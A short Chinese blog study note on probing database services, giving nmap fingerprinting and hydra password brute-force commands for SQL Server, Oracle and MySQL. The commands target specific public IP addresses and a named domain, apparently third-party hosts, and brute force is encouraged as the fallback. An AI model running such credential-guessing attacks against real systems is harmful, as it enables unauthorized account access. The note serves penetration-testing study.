ailx10说：这篇是在2023年6月之前写的，后来又改过。数据库服务这一章没有绕太远，SQL Server、Oracle、MySQL，先认服务，再看认证和常见检查办法。我把书里的命令按对象放在一起，免得一会儿换工具、一会儿换端口，把自己绕乱。和前面的 Web 评估并排看，这里像是往后端再退了一层：用户看到页面，数据却由另一套服务守着。它是一篇比较朴素的学习小抄，重点是把不同数据库的入口先分清，后面再碰具体问题，就知道该从哪条线继续问。

---

Oracle 监听器与数据库账号是不同对象，各自的认证、权限与测试结果需要分别确认。



![](/notes-assets/9fe11ac9610f7632a79a.webp)

如果数据库端口对我们开放，先进行指纹识别，如果版本比较低有漏洞，那么就走漏洞利用，如果没有漏洞，那么就走暴力破解，坚持10年，脚本小子，总能成为安全大神。

1、sql server 指纹识别

```
nmap -Pn -sV 47.98.47.58 -p  1433
```

![](/notes-assets/3795986f37e279bfff42.webp)

2、sql server 暴力破解

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt mssql://47.98.47.58
```

![](/notes-assets/13784dca86ca92f94060.webp)

3、oracle 指纹识别

```
nmap -Pn -sV 120.24.5.197 -p 1521
```

![](/notes-assets/20f8beae77b0796bddec.webp)

4、oracle 暴力破解

```
hydra -P /usr/share/wordlists/rockyou.txt oracle-listener://120.24.5.197
```

![](/notes-assets/59ada1647c639bffcda3.webp)

5、mysql 指纹识别

```
nmap -Pn -sV webmail.rusc60.club -p 3306
```

![](/notes-assets/a0bddc122e21d72d5da6.webp)

6、mysql 暴力破解

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt mysql://webmail.rusc60.club -t 1
```

![](/notes-assets/652c9a6750d1385cc75b.webp)

能连到端口只是起点，不代表可以登录或读取业务数据。每一层边界都单独确认，结果才不会因为一条成功响应而被放大。
